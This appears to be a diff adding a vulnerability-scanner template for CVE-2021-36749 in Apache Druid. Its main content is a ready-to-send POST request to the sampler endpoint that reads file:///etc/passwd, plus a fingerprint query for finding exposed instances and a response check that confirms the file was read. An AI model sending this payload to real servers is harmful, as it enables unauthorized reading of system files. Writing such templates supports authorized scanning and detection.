@@ -1,0 +1,23 @@
+name: Apache Druid Arbitrary File Read (CVE-2021-36749)
+manual: true
+query: title="Apache Druid"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /druid/indexer/v1/sampler?for=connect
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: '{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
+      follow_redirects: true
+    expression: response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+  author: luckying1314@139.com
+  links:
+  - https://github.com/BrucessKING/CVE-2021-36749
+  description: 'Because the user specified the HTTP InputSource without restriction,
+    you can bypass the application level restriction by passing the file URL to the
+    HTTP InputSource.  '
+  tags: fileread
